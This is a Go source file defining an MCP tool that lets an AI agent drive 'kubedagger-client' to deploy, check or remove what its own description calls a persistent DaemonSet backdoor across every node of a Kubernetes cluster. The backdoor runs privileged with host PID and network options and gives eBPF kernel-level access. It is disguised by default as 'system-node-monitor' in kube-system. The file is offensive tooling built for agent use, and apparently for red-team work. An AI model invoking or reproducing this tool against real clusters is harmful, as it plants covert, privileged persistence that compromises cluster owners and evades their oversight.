package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

type DaemonsetInput struct {
	Action    string `json:"action"`
	Name      string `json:"name,omitempty"`
	Namespace string `json:"namespace,omitempty"`
	Image     string `json:"image,omitempty"`
	Privileged bool  `json:"privileged,omitempty"`
	HostPID   bool   `json:"host_pid,omitempty"`
	HostNet   bool   `json:"host_network,omitempty"`
}

type DaemonsetTool struct {
	exec executor.Executor
}

func NewDaemonset(exec executor.Executor) *DaemonsetTool {
	return &DaemonsetTool{exec: exec}
}

func (t *DaemonsetTool) Name() string { return "kubedagger_daemonset" }

func (t *DaemonsetTool) Description() string {
	return "Deploy, remove, or check status of a persistent DaemonSet backdoor across all cluster nodes. Runs with elevated privileges to maintain kernel-level access via eBPF programs on every node."
}

func (t *DaemonsetTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"action": {
				"type": "string",
				"enum": ["deploy", "remove", "status"],
				"description": "DaemonSet action"
			},
			"name": {
				"type": "string",
				"description": "DaemonSet name (default: system-node-monitor)"
			},
			"namespace": {
				"type": "string",
				"description": "Namespace to deploy in (default: kube-system)"
			},
			"image": {
				"type": "string",
				"description": "Container image to use"
			},
			"privileged": {
				"type": "boolean",
				"description": "Run in privileged mode"
			},
			"host_pid": {
				"type": "boolean",
				"description": "Share host PID namespace"
			},
			"host_network": {
				"type": "boolean",
				"description": "Use host network"
			}
		},
		"required": ["action"]
	}`)
}

func (t *DaemonsetTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input DaemonsetInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateNamespace(input.Namespace); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Name, "name"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Image, "image"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"daemonset", input.Action}
	if input.Name != "" {
		args = append(args, "--name", input.Name)
	}
	if input.Namespace != "" {
		args = append(args, "--namespace", input.Namespace)
	}
	if input.Image != "" {
		args = append(args, "--image", input.Image)
	}
	if input.Privileged {
		args = append(args, "--privileged")
	}
	if input.HostPID {
		args = append(args, "--host-pid")
	}
	if input.HostNet {
		args = append(args, "--host-network")
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger daemonset failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	fmt.Fprintf(&sb, "## KubeDagger DaemonSet: %s\n\n", input.Action)
	if output == "" {
		sb.WriteString("Operation complete.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
